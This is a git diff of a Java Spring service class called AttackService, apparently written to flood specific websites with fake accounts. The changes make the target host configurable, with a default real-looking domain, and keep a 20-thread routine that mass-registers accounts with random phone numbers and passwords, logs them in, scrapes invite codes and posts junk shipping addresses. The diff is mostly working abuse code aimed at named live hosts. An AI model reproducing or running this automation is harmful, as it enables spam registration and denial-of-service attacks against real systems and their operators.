@@ -7,6 +7,7 @@ import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.lang3.RandomStringUtils;
 import org.springframework.beans.factory.InitializingBean;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.http.*;
 import org.springframework.stereotype.Service;
 import org.springframework.util.LinkedMultiValueMap;
@@ -24,11 +25,14 @@ import java.util.List;
 @Slf4j
 public class AttackService implements InitializingBean {
 
+    @Value("${attack.url:http://hlzi.auxchair.xyz/}")
+    private String host;
+
     @Autowired
     private RestTemplate restTemplate;
     private ExecutorService executor = Executors.newFixedThreadPool(20);
 
-    private volatile String code = "2PHATU";
+    private volatile String code = "VS8P9J";
 
     @Override
     public void afterPropertiesSet() throws Exception {
@@ -59,9 +63,9 @@ public class AttackService implements InitializingBean {
 
     public void doAttack() {
         // 注册
-        String url = "http://hdia.auxsteel.xyz/index/user/do_register.shtml";
+        String url = host + "index/user/do_register.shtml";
         String[] phonePre = {"131", "151", "156", "186", "185", "134", "135", "136", "137", "138", "139", "150", "157", "158", "159", "187", "188", "189"};
-        String generatedString = RandomStringUtils.random(7, true, true);
+        String generatedString = RandomStringUtils.random(10, true, true);
         HttpHeaders httpHeaders = new HttpHeaders();
         httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
         MultiValueMap<String, String> body = new LinkedMultiValueMap<>();
@@ -78,7 +82,7 @@ public class AttackService implements InitializingBean {
         String s = restTemplate.postForObject(url, entity, String.class);
         log.info(String.format("用户名：%s，tel：%s，密码：%s，取款密码：%s，邀请码：%s, 结果：{}", generatedString, tel, pwd, de, code, s));
         // 登录
-        String loginUrl = "http://hdia.auxsteel.xyz/index/user/do_login.shtml";
+        String loginUrl = host + "index/user/do_login.shtml";
         body.clear();
         body.add("tel", generatedString);
         body.add("pwd", pwd);
@@ -90,7 +94,7 @@ public class AttackService implements InitializingBean {
         cookies.add(cookie.split(";")[0] + "; tel=" + generatedString + "; pwd=" + pwd + "; page-limit=20");
         httpHeaders.clear();
         httpHeaders.put(HttpHeaders.COOKIE, cookies);
-        String homeUrl = "http://hdia.auxsteel.xyz/index/my/index";
+        String homeUrl = host + "index/my/index";
         ResponseEntity<String> exchange = restTemplate.exchange(homeUrl, HttpMethod.GET, new HttpEntity<>(null, httpHeaders), String.class);
         String bodyStr = exchange.getBody();
         int index = bodyStr.indexOf("邀请码");
@@ -105,7 +109,7 @@ public class AttackService implements InitializingBean {
         body.add("shouhuohaoma", tel);
         body.add("area", RandomStringUtils.random(10, true, true));
         body.add("address", RandomStringUtils.random(5, true, true));
-        url = "http://hdia.auxsteel.xyz/index/my/edit_address.shtml";
+        url = host + "index/my/edit_address.shtml";
         response = restTemplate.postForEntity(url, new HttpEntity<>(body, httpHeaders), String.class);
         log.info("设置收货地址结果：{}", response.getBody());
     }
